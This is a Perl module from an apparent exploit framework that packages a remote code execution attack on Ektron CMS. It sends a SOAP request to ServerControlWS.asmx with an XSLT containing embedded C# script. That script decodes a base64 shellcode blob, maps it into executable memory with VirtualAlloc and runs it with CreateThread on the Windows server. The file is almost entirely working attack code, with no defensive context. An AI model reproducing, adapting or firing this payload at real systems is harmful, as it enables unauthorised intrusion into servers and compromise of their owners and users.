package MSFPerlExploits::EKTRON::MSF::XsltExecWs;
use parent qw(P1rK3r::Exploit P1rK3r::Services::EKTRON);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "XsltExecWs";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'XsltExecWs',
        TYPE => 'MSF',
        PLATFORM => 'WINDOWS',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'WorkArea/ServerControlWS.asmx',
                        PAYLOAD      => '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ContentBlockEx xmlns="http://www.ektron.com/CMS400/Webservice">
      
      <Xslt>
        <![CDATA[
        <xsl:transform version="2.0"
          xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
          xmlns:msxsl="urn:schemas-microsoft-com:xslt"
          xmlns:user="http://mycompany.com/mynamespace">
          <msxsl:script language="C#" implements-prefix="user">

            private static UInt32 MEM_COMMIT = 0x1000;
            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

            [System.Runtime.InteropServices.DllImport(&quot;kernel32&quot;)]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

            [System.Runtime.InteropServices.DllImport(&quot;kernel32&quot;)]
            private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

            public string xml()
            {
              string shellcode64 = @&quot;kZD8SZiS/Eg3/fX5P5NOl0r4Jyf1/EGYm/hAn/mbT0FL+ZA/kJaTlkJD/UOQS0KYk0ov1j/5Sv1DkEZJS/z1QD9LTkH9N/iYT5+WkUhHk5mWlkjWmzc/T5JJQE+Z+UFDS5f8/PmTQ0f41p+bL/2fQ05PTjc/k0dK+EKfSZsvS0JB+EvWn5f5T06QP0ZON0tGQZ8vS06W1pOQS5mfJ/jWmJYnmZuYkdabmEj4SpiSkEJBJ9ZBlktDR59I1vz4k0gnSJmZkkP5QEdK1kqWlkMnSp9CQvmQQDeZn/VKkSdOkEefL0L8T0KTkv2fRkGQTtZLSkvW+UdGkiefmEk/mJ8vR5KSSEtH+Uj9RzeRlydGl/1JP0qTQ5eWQkEnRpL9SPw3mSeYQpObl0qb/Pz1P09HRv2bkJ/4NydDT/xOJ5OZJ0hA/EEvQjcn/ZeRQUhBS/0vRz+S/ZPWm59DkUNGmTf8P5KYQ5MnR0BBk0D9/UGS/Ej1+Uaflj+WQydJSkE3mZtG+JmbSZv9J59JSk+ZmPhI+UY3RjfWSJeXmfyR9Us/lkP9S0g/N0svlvVIN0BD1paRSUg3QpNIm9bWP06XmJ9I+fhOmZaZmPX5P0cvSdafkEonkflHJ5BDkP1A+Z+SlkE3SkZOSJFCSTdJTk+QT0JI/f2QSpv5L5P8Qp/89fw/mC9LSptBRpBKn0tPQ0NKmZiR9ZCXm/hAk0tC/EA/J04nm5GQn5MvT5BAk/g3QNb5L0pCmEFJSD+S/Cc3m0FLT0n9/J8vJ5KfS04nny9HSidJ1vmRT5iRlvhLkUuQkZeWQyf9S9bWRzeXQUY/T/031piSN0JKTifWlpJDTk+XR9Y/mfVHSkgvS0lKRkFIJ5dBQEj9lpaSmUdLQC9HT0hC1kD4SpZIQ5mTSZc3n5FKlphKmSeYQJM/9ZhISkP9l5DWSvyTSkKSkpEvn0ZGN5ifL5ZGn/g/lpv9l5iTT5BJ1j+T1pM3/flOkENP9UBDQydAm0H4l9b49UJAT09Hk0k/Rpv5SZuQSJv5R0JGn0H5m0BDm0/5T0BIkPlAQ0tOSkGYT0lKkJNIJ0OfTkEvJ/2bT5P5SJf4QJJAkUfWSZZGl5lBL5j5RydPmZeWP0KfSzdLly+SmUNIkD+XTpiZ1kL5N5FKltZPQZuYN/k/R0lDN09A+U5AmEFGP5EnQJP9QSdGkZf9N5JLmZKTl5BKSPiWR0b5/f2RkkFPm0L9mU5JQPWRkdabkJFD/UFHk5NGlkCf/NaTn5H1SPWYRkeRQC+Xm04/L5P9T0b8Tpv1N0KRkkH1kz+R/UlJl5mT+JBOmzebkDdC+S/4RpmZn0H4Q0b51ieQQpL5S5DWJ5dJJ5abk0mZSyeYSkcvlvlD1kEnkZvW/ZuQ+UiYmPmQmUpOT0OYkPhPQjdCSfVO+UCQmEifL/hGJz+XmP2YTkBKlk+bSkcnT59D9ZOZmC9DTj8nkEYnR59I/ZfWkZj5Spn5k5OWSklJQpKYSpNIR5+b9UJDl0g3T5A3SpY/+Tf8+EHW+EHW+JJHmZD5/ZiQ+UqS9ZKQQ0dATkn8Q09HSEdJSEdCJ5FKQvz9RkGZQ/2Q+UYvQZiYQpOfJ0KRn5ZBQkZJQ0mQQZP5mU9AQfhOkPiRSNaXJ5JIJyeQQEqZQD9Hm04vRp9G1vkv/J83QJM3kj+Rl/VBkPU3+UsvkJmXl5BDn5OSS5aXm5n5R/lHRpb99fmYkElDS0tPL0KbSUI/RjdD/ZCRQfj8+PX5RtYnRy9Gk58nT5lCQUCWmUKR+P34kC+bmSf4N/X9mZ8v1kb4kDc3QpiRQ5/8m0n9k5vWkT9LSpM/mTcnSfxIk0H5SvVLk0JDN0CZ+ZaS/E6Rn0j9m0In/En4SElA/PjWk0s3SPhAmPhHkUlDlko/kvj9kEdGTk+YkU9B+Jab/UlPkpGWkj9GN5svm0OYR/VKR043+DeQQEv5L0aT/JBCkNZA/En5m09P+JeWkfhOP/2X+f2YSEP8+JsvR0An+JNIP/WQmJtOlkf5QT9OS5NDQ5tAk5/1Q0mZ+JtOQ5GY/ZtDSkiRTi+RmJNDQJ/5l5j1SpY3P0NHn/VC+CdISflImZGfmU5O+EiXSZmYSJFLN/yZL5H4/E+YRv2R/EaWSJZPn9aR1pNBkzdBl5dBkkNCSZhPQ5hPQkmSktb9mEufQk/5QZOWn0dOkfj5mUn4mPlA+DeWkEGR+ZCQ/UiRJ5JGk0aQ1pb9QZDWL5L4/EZAkPyfkflPSPhHQvhBQpNL9UFB/PU/kEb8QUdAQkL51kNCJ0FHTp/4mZOXS0uT9T+Tk09DRp9DmPhCSJsnRpeZ+UL5mCeZ+EE//EpAQ/1HP0afSfVASfz4S5+fRpNK1v1J+E+TkUaQmUY/m/iYQ5/1lpdBQdZJl09I+SeSkkNOnz9Ak5AvP0hBJ5tBR06RR0af+EknQCdDN5j5k/mTQZk/lkhBN5ZK+EaZ1k5J+ZE3lvX8N0hCRvjW+CdBR/lAmZj8k/hCL/n9kEb5Q0OZmf31k9aWSUZPmfWf+U6YN0GRnz+Y+UeSSCeXkpeb+fmQQZL8SJFCkvhGJ5+XSkmXk5M/9UJOkUdBS59GlvVLSdb1mUaWl5JOn0OY+UiSSJ9GN5mSmPiZSEpPTifWlz9DQ/iRN0lGP59AL08/QZJBT5aXQi/8TkFIkpeXQf2XmZknR5L4J5ZLlpaZmUBLSkZHmzf8gcRU8v//X19QQVlMT0FEX18=&quot;;
              byte[] shellcode = System.Convert.FromBase64String(shellcode64);
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
              IntPtr hThread = IntPtr.Zero;
              IntPtr pinfo = IntPtr.Zero;
              UInt32 threadId = 0;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              return &quot;uKNFyYjAq&quot;;
            }
          </msxsl:script>
          <xsl:template match="/">
            <xsl:value-of select="user:xml()"/>
          </xsl:template>
        </xsl:transform>
        ]]>
      </Xslt>
    </ContentBlockEx>
  </soap:Body>
</soap:Envelope>

',
                        TEXT         => 'Sending First Exploit Request On : /WorkArea/ServerControlWS.asmx',
                        HEADERS      => {
                           'Referer' => 'http://127.0.0.1:80/3v1l/WINDOWS/EKTRON/XsltExecWs/',
                           'Content-Type' => 'text/xml; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;